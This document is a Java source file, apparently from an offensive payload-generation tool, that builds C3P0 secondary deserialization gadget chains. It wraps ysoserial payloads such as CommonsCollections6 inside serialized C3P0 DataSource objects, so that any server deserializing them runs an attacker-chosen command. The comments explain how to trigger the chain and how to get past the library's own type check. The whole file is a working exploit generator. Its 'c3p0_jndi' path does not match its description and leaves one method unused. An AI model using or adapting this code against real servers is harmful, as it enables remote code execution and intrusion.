package com.oobx.chains;

import org.springframework.stereotype.Component;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Map;

/**
 * C3P0 secondary deserialization gadget chains.
 *
 * Two sub-chains (same as java-chains C3P0 gadgets):
 *
 * 1. c3p0_jndi — WrapperConnectionPoolDataSource.userOverridesAsString → JNDI lookup
 *    Works on C3P0 ≤0.9.5.2 with old SUID; triggers outbound JNDI call when deserialized.
 *
 * 2. c3p0_wrapperds — PoolBackedDataSource.connectionPoolDataSource → secondary deserialize
 *    Embeds any ysoserial payload as serialized hex inside the C3P0 object;
 *    triggers native deserialization via ReferenceSerialized.getObject().
 *    Useful when target has C3P0 but no direct gadget dependency.
 */
@Component
public class C3P0ChainHandler implements ChainHandler {

    private final YsoserialHandler ysoHandler;

    public C3P0ChainHandler(YsoserialHandler ysoHandler) {
        this.ysoHandler = ysoHandler;
    }

    @Override
    public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
        return switch (chainId) {
            // c3p0_jndi uses the same PoolBackedDataSource structure as c3p0_wrapperds:
            // getPooledConnection() alone does NOT trigger parseUserOverridesAsString();
            // only PoolBackedDataSource.getConnection() initialises the pool and calls it.
            case "c3p0_jndi"      -> generateWrapperDs(params);
            case "c3p0_wrapperds" -> generateWrapperDs(params);
            default -> throw new IllegalArgumentException("Unknown c3p0 chain: " + chainId);
        };
    }

    /**
     * WrapperConnectionPoolDataSource secondary-deserialization chain (c3p0_jndi).
     *
     * userOverridesAsString = HexAsciiSerializedMap:<hex of CC6 payload>
     * Trigger: target calls getConnection() on the deserialized WrapperConnectionPoolDataSource
     * → C3P0ImplUtils.parseUserOverridesAsString() → ObjectInputStream.readObject() → CC6 → cmd
     *
     * VulnLabServer /deser endpoint calls getConnection() on deserialized DataSource objects.
     */
    private PayloadResult generateJndi(Map<String, Object> params) throws Exception {
        String cmd = (String) params.getOrDefault("cmd", "id");
        String innerChain = (String) params.getOrDefault("chain", "CommonsCollections6");

        // Build inner CC6 payload
        Map<String, Object> innerParams = new java.util.HashMap<>(params);
        innerParams.put("cmd", cmd);
        String ysoId = switch (innerChain.toLowerCase()) {
            case "cc6", "commonscollections6" -> "ysoserial_cc6";
            case "cc1", "commonscollections1" -> "ysoserial_cc1";
            case "cb1", "commonsbeanutils1"   -> "ysoserial_cb1";
            default -> "ysoserial_cc6";
        };
        byte[] innerBytes = ysoHandler.generate(ysoId, innerParams).bytes();

        Class<?> cls = Class.forName("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource");
        Object obj = cls.getDeclaredConstructor().newInstance();
        // Use direct field injection — the setter fires a PropertyChangeListener that immediately
        // calls parseUserOverridesAsString(), which fails to cast CC6's HashSet root to Map.
        setFieldValue(obj, "userOverridesAsString", "HexAsciiSerializedMap:" + bytesToHex(innerBytes) + ";");

        byte[] bytes = serialize(obj);
        return new PayloadResult("application/octet-stream", bytes,
            Map.of("cmd", cmd,
                   "note", "C3P0 userOverridesAsString secondary deser → cmd executes when getConnection() called"));
    }

    /**
     * PoolBackedDataSource secondary deserialization chain.
     * Embeds an inner serialized payload that gets deserialized when C3P0 reconstructs the object.
     */
    private PayloadResult generateWrapperDs(Map<String, Object> params) throws Exception {
        String innerChain = (String) params.getOrDefault("chain", "CommonsCollections6");
        String cmd = (String) params.getOrDefault("cmd", "id");

        // Get inner payload from ysoserial
        Map<String, Object> innerParams = new java.util.HashMap<>(params);
        innerParams.put("cmd", cmd);
        String ysoId = switch (innerChain.toLowerCase()) {
            case "cc6", "commonscollections6" -> "ysoserial_cc6";
            case "cc1", "commonscollections1" -> "ysoserial_cc1";
            case "cb1", "commonsbeanutils1"   -> "ysoserial_cb1";
            case "spring1"                    -> "ysoserial_spring1";
            case "rome"                       -> "ysoserial_rome";
            default -> "ysoserial_" + innerChain.toLowerCase();
        };
        PayloadResult inner = ysoHandler.generate(ysoId, innerParams);
        byte[] innerBytes = inner.bytes();

        // Build PoolBackedDataSource — use public API to avoid private-field access issues
        Class<?> pbdsCls = Class.forName("com.mchange.v2.c3p0.PoolBackedDataSource");
        Object pbds = pbdsCls.getDeclaredConstructor().newInstance();

        // Use public setConnectionPoolDataSource(ConnectionPoolDataSource)
        Object refDs = buildRefDs(innerBytes);
        try {
            Class<?> cpdsClass = Class.forName("javax.sql.ConnectionPoolDataSource");
            pbdsCls.getMethod("setConnectionPoolDataSource", cpdsClass).invoke(pbds, refDs);
        } catch (Exception e) {
            // fallback: direct field set
            setFieldValue(pbds, "connectionPoolDataSource", refDs);
        }

        byte[] bytes = serialize(pbds);
        return new PayloadResult("application/octet-stream", bytes,
            Map.of("inner_chain", innerChain, "cmd", cmd,
                   "note", "C3P0 secondary deserialization — inner chain executes on C3P0 restore"));
    }

    private Object buildRefDs(byte[] innerPayload) throws Exception {
        Class<?> cls = Class.forName("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource");
        Object obj = cls.getDeclaredConstructor().newInstance();
        // Direct field set: bypasses PropertyChangeListener that eagerly parses and rejects non-Map payloads
        setFieldValue(obj, "userOverridesAsString", "HexAsciiSerializedMap:" + bytesToHex(innerPayload) + ";");
        return obj;
    }

    private Field findField(Class<?> cls, String name) {
        Class<?> c = cls;
        while (c != null) {
            try { return c.getDeclaredField(name); } catch (NoSuchFieldException e) { c = c.getSuperclass(); }
        }
        return null;
    }

    private void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = findField(obj.getClass(), fieldName);
        if (f != null) { f.setAccessible(true); f.set(obj, value); }
    }

    private byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(obj);
        }
        return bos.toByteArray();
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b));
        return sb.toString();
    }
}
